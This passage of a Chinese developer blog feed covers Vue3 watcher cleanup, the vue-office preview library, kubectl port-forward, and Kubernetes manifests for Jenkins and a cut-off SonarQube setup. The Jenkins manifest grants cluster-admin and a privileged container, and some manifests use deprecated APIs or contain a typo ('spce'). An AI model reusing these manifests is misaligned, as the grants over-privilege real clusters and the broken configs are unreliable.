<h2 id="一、Vue3-的-watch-机制"><a href="#一、Vue3-的-watch-机制" class="headerlink" title="一、Vue3 的 watch 机制"></a>一、Vue3 的 watch 机制</h2><h3 id="1-1-基本用法"><a href="#1-1-基本用法" class="headerlink" title="1.1 基本用法"></a>1.1 基本用法</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref, watch &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本监听模式</span></span><br><span class="line"><span class="keyword">const</span> stopWatch = <span class="title function_">watch</span>(count, <span class="function">(<span class="params">newVal, oldVal</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`值从 <span class="subst">$&#123;oldVal&#125;</span> 变为 <span class="subst">$&#123;newVal&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止监听</span></span><br><span class="line"><span class="comment">// stopWatch() // 手动调用停止监听</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2-自动停止机制"><a href="#1-2-自动停止机制" class="headerlink" title="1.2 自动停止机制"></a>1.2 自动停止机制</h3><p>当在组件 setup() 中同步创建时，Vue3 会自动关联生命周期：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 自动绑定组件生命周期</span></span><br><span class="line">    <span class="title function_">watch</span>(count, <span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Count changed:&#x27;</span>, val)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123; count &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>组件卸载时，Vue 会自动停止这些监听器，无需手动干预。</p>
<h2 id="二、必须手动清除的-3-种场景"><a href="#二、必须手动清除的-3-种场景" class="headerlink" title="二、必须手动清除的 3 种场景"></a>二、必须手动清除的 3 种场景</h2><h3 id="2-1-异步创建的监听器"><a href="#2-1-异步创建的监听器" class="headerlink" title="2.1 异步创建的监听器"></a>2.1 异步创建的监听器</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; onMounted, onUnmounted &#125; <span class="keyword">from</span><span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line">exportdefault &#123;</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> stopWatch = <span class="literal">null</span></span><br><span class="line">    </span><br><span class="line">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 异步创建监听器</span></span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        stopWatch = <span class="title function_">watch</span>(<span class="comment">/* ... */</span>)</span><br><span class="line">      &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">onUnmounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (stopWatch) &#123;</span><br><span class="line">        <span class="title function_">stopWatch</span>() <span class="comment">// 必须手动清除</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键点：Vue 无法追踪异步创建的监听器，需要开发者自行管理</p>
<h3 id="2-2-动态条件监听"><a href="#2-2-动态条件监听" class="headerlink" title="2.2 动态条件监听"></a>2.2 动态条件监听</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> searchKeyword = <span class="title function_">ref</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> searchWatch = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据用户操作动态创建</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">enableSearch</span>(<span class="params"></span>) &#123;</span><br><span class="line">  searchWatch = <span class="title function_">watch</span>(searchKeyword, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 执行搜索逻辑</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">disableSearch</span>(<span class="params"></span>) &#123;</span><br><span class="line">  searchWatch?.() <span class="comment">// 主动销毁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>典型场景：需要运行时动态启用的监听逻辑。</p>
<h3 id="2-3-全局状态监听"><a href="#2-3-全局状态监听" class="headerlink" title="2.3 全局状态监听"></a>2.3 全局状态监听</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// store.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; watch &#125; <span class="keyword">from</span><span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span><span class="string">&#x27;./store&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局监听（危险操作！）</span></span><br><span class="line"><span class="keyword">let</span> globalWatcher = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span><span class="keyword">function</span> <span class="title function_">initGlobalWatch</span>(<span class="params"></span>) &#123;</span><br><span class="line">  globalWatcher = <span class="title function_">watch</span>(</span><br><span class="line">    <span class="function">() =&gt;</span> store.<span class="property">state</span>.<span class="property">user</span>,</span><br><span class="line">    <span class="function">(<span class="params">user</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;User changed:&#x27;</span>, user)</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span><span class="keyword">function</span> <span class="title function_">cleanupGlobalWatch</span>(<span class="params"></span>) &#123;</span><br><span class="line">  globalWatcher?.()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>风险提示：全局监听器不会自动销毁，必须提供显式清理接口。</p>
<h2 id="三、智能管理方案"><a href="#三、智能管理方案" class="headerlink" title="三、智能管理方案"></a>三、智能管理方案</h2><h3 id="3-1-自动管理组合式函数"><a href="#3-1-自动管理组合式函数" class="headerlink" title="3.1 自动管理组合式函数"></a>3.1 自动管理组合式函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; watchEffect, onScopeDispose &#125; <span class="keyword">from</span><span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span><span class="keyword">function</span> <span class="title function_">useAutoCleanWatcher</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">const</span> stop = <span class="title function_">watchEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 副作用逻辑</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自动注册清理</span></span><br><span class="line">  <span class="title function_">onScopeDispose</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">stop</span>()</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123; stop &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>优势：利用 onScopeDispose 实现自动清理。</p>
<h3 id="3-2-监听器工厂模式"><a href="#3-2-监听器工厂模式" class="headerlink" title="3.2 监听器工厂模式"></a>3.2 监听器工厂模式</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createSmartWatcher</span>(<span class="params">source, callback</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> stop = <span class="title function_">watch</span>(source, callback)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">    stop,</span><br><span class="line">    <span class="attr">restart</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">stop</span>()</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">createSmartWatcher</span>(source, callback)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用示例</span></span><br><span class="line"><span class="keyword">const</span> &#123; stop &#125; = <span class="title function_">createSmartWatcher</span>(value, <span class="function">() =&gt;</span> &#123;&#125;)</span><br></pre></td></tr></table></figure>
<p>扩展性：封装重启功能，增强可维护性。</p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3组件库总结一【Vue-Office】</title>
    <url>/cnblogs.github.io/p/2efc.html</url>
    <content><![CDATA[<p><strong>vue-office简介</strong><br>vue-office是一个支持多种文件(docx、.xlsx、pdf)预览的vue组件库，支持vue2和vue3。 目标是成为使用最简单，功能最强大的文件预览库。</p>
<p><strong>功能特点</strong><br>一站式提供docx、.xlsx、pdf多种文档的在线预览方案，有它就够了，不用再四处寻找、测试、集成各种库了。使用简单只需提供文档的src(网络地址)即可完成文档预览，也支持ArrayBuffer、Blob等多种格式。支持样式不仅能预览内容，也支持文档样式，最大限度还原office文件内容 只需提供文档的src(网络地址)即可完成文档预览，也支持ArrayBuffer、Blob等多种格式&#96;</p>
<p><strong>安装步骤</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docx文档预览组件</span></span><br><span class="line">npm install @vue-office/docx vue-demi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">excel文档预览组件</span></span><br><span class="line">npm install @vue-office/excel vue-demi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pdf文档预览组件</span></span><br><span class="line">npm install @vue-office/pdf vue-demi</span><br></pre></td></tr></table></figure>
<p>如果是vue2.6版本或以下还需要额外安装 @vue&#x2F;composition-api</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install @vue/composition-api</span><br></pre></td></tr></table></figure>
<p><strong>案例</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">vue-office-docx</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-if</span>=<span class="string">&quot;currentAttachment.type === &#x27;docx&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:src</span>=<span class="string">&quot;docx&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">style</span>=<span class="string">&quot;height: 100vh;&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">rendered</span>=<span class="string">&quot;renderedHandler&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">error</span>=<span class="string">&quot;errorHandler&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">v-if</span>=<span class="string">&quot;currentAttachment.type === &#x27;pdf&#x27;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;height:100%;&quot;</span> <span class="attr">:src</span>=<span class="string">pdf</span>&quot; <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">vue-office-excel</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:src</span>=<span class="string">&quot;excel&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-if</span>=<span class="string">&quot;currentAttachment.type === &#x27;xls&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">style</span>=<span class="string">&quot;height: 100vh;&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">rendered</span>=<span class="string">&quot;renderedHandler&quot;</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">error</span>=<span class="string">&quot;errorHandler&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//引入VueOfficeDocx组件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> <span class="title class_">VueOfficeDocx</span> <span class="keyword">from</span> <span class="string">&#x27;@vue-office/docx&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> <span class="title class_">VueOfficeExcel</span> <span class="keyword">from</span> <span class="string">&#x27;@vue-office/excel&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//引入相关样式</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> <span class="string">&#x27;@vue-office/docx/lib/index.css&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> <span class="string">&#x27;@vue-office/excel/lib/index.css&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">VueOfficeDocx</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">VueOfficeExcel</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">docx</span>: <span class="string">&#x27;http://xxx.com/test6.docx&#x27;</span>, <span class="comment">//设置文档网络地址，可以是相对地址</span></span></span><br><span class="line"><span class="language-javascript">                <span class="attr">excel</span>: <span class="string">&#x27;http://xxx.com/test3.xls&#x27;</span>, <span class="comment">//设置文档网络地址，可以是相对地址</span></span></span><br><span class="line"><span class="language-javascript">                <span class="attr">pdf</span>: <span class="string">&#x27;http://xxx.com/test1.pdf&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">renderedHandler</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;渲染完成&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">errorHandler</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;渲染失败&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我这里没有用pdf组件，这个vue-office组件好处就是可以单独引用，pdf预览我这边用的iframe这就满足需求了。</p>
<p><strong>注意</strong><br>word 只支持docx后缀文件</p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes命令详解一【Port-forward命令】</title>
    <url>/cnblogs.github.io/p/4e2.html</url>
    <content><![CDATA[<p>kubectl port-forward 是 Kubernetes 中一个非常有用的命令，它允许你将本地机器的端口转发到 Kubernetes 集群中的 Pod 或服务。这对于调试应用程序、访问集群内部的服务（如数据库、Web 界面等）非常有帮助。</p>
<blockquote>
<p>基本语法</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl port-forward &lt;资源类型&gt;/&lt;资源名称&gt; [选项]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">转发到 Pod</span></span><br><span class="line">kubectl port-forward pod/&lt;pod-name&gt; &lt;本地端口&gt;:&lt;容器端口&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例： 将本地的 8080 端口转发到名为 my-pod 的 Pod 中容器的 80 端口。</span></span><br><span class="line">kubectl port-forward pod/my-pod 8080:80</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">转发到 Service</span></span><br><span class="line">kubectl port-forward service/&lt;service-name&gt; &lt;本地端口&gt;:&lt;服务端口&gt;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：将本地的 8080 端口转发到名为 my-service 的服务所暴露的 80 端口上（最终流量会到达对应 Pod）</span></span><br><span class="line">kubectl port-forward service/my-service 8080:80</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">多个端口转发</span></span><br><span class="line">kubectl port-forward pod/my-pod 8080:80 3000:3000</span><br></pre></td></tr></table></figure>
<p><strong>注意事项</strong></p>
<ul>
<li>不需要公网 IP 或 Ingress：port-forward 不依赖外部网络配置，适合开发和调试。</li>
<li>仅用于临时用途：不适用于生产环境或长期连接。</li>
<li>支持 TCP，不支持 UDP。</li>
<li>Pod 必须处于 Running 状态。</li>
<li>如果你不指定命名空间，默认是 default。可以通过 -n <namespace> 指定命名空间。</li>
</ul>
<blockquote>
<p>示例场景</p>
</blockquote>
<p><strong>连接集群内的数据库（如 MySQL）</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl port-forward pod/mysql-pod 3306:3306</span><br></pre></td></tr></table></figure>
<p>然后可以使用本地客户端连接 localhost:3306 来访问集群中的 MySQL 数据库。</p>
<p><strong>访问 Web UI（如 Prometheus）</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl port-forward service/prometheus-service 9090</span><br></pre></td></tr></table></figure>
<p>浏览器打开 <a href="http://localhost:9090/">http://localhost:9090</a> 即可访问 Prometheus 的 Web 界面。</p>
<p>️<strong>其他选项</strong></p>
<ul>
<li>–namespace 或 -n：指定命名空间</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl port-forward -n my-namespace pod/my-pod 8080:80</span><br></pre></td></tr></table></figure>
<ul>
<li>后台运行：可以加上 &amp; 放入后台运行（Linux&#x2F;macOS）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl port-forward pod/my-pod 8080:80 &amp;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes安装软件一【Jenkins】</title>
    <url>/cnblogs.github.io/p/1590.html</url>
    <content><![CDATA[<p><strong>k8s 部署 Jenkins</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Namespace</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">jenkins</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">jenkins</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">jenkins</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">jenkins-crb</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">jenkins</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">jenkins</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">StatefulSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">jenkins-master</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">jenkins</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">serviceName:</span> <span class="string">jenkins</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">devops:</span> <span class="string">jenkins-master</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">devops:</span> <span class="string">jenkins-master</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">tolerations:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">      <span class="attr">serviceAccount:</span> <span class="string">jenkins</span></span><br><span class="line">      <span class="attr">initContainers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">fix-permissions</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">busybox</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;chown -R 1000:1000 /var/jenkins_home&quot;</span>]</span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">jenkinshome</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/var/jenkins_home</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">jenkins</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">jenkinsci/blueocean:latest</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http</span> <span class="comment">#Jenkins Master Web 服务端口</span></span><br><span class="line">          <span class="attr">containerPort:</span> <span class="number">8080</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">slavelistener</span> <span class="comment">#Jenkins Master 供未来 Slave 连接的端口</span></span><br><span class="line">          <span class="attr">containerPort:</span> <span class="number">50000</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">jenkinshome</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/var/jenkins_home</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">jenkinshome</span></span><br><span class="line">        <span class="attr">hostPath:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">/usr1/jenkins</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">jenkins</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">jenkins</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">8080</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">slavelistener</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">50000</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">50000</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">devops:</span> <span class="string">jenkins-master</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">jenkins-web</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">jenkins</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">Kubernetes.io/ingress.class:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">www.jenkins.com</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">serviceName:</span> <span class="string">jenkins</span></span><br><span class="line">          <span class="attr">servicePort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>
<p>简单描述一下：</p>
<ul>
<li>创建命名空间，并增加账户管理</li>
<li>通过 StatefulSet 创建 Jenkins 服务容器，绑定了持久化存储卷</li>
<li>创建 Service 和 Ingress，通过 Ingress 向外提供服务，Service 内的 NodePort 定义可以去掉</li>
</ul>
<p>安装完成后，如果配置了 Ingress，我们在当前机器上配置好 hosts，就可以通过 <a href="http://www.jenkins.com/">www.jenkins.com</a> 去访问了；如果没有配置 Ingress，可以通过节点和端口去访问，执行以下命令查询 NodePort 端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get service -n jenkins</span><br></pre></td></tr></table></figure>
<p>然后通过以下命令查询管理员密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get pod -n jenkins</span><br><span class="line">kubectl exec jenkins-master-0 -n jenkins -- cat /var/jenkins_home/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes安装软件二【sonarqube】</title>
    <url>/cnblogs.github.io/p/40597.html</url>
    <content><![CDATA[<p><strong>kubernetes 搭建 sonarqube 扫描环境</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">sonarqube</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">jenkins</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">sonarqube</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">sonarqube</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">9000</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">9000</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">sonarqube</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">jenkins</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">sonarqube</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">sonarqube</span></span><br><span class="line"><span class="attr">spce:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span 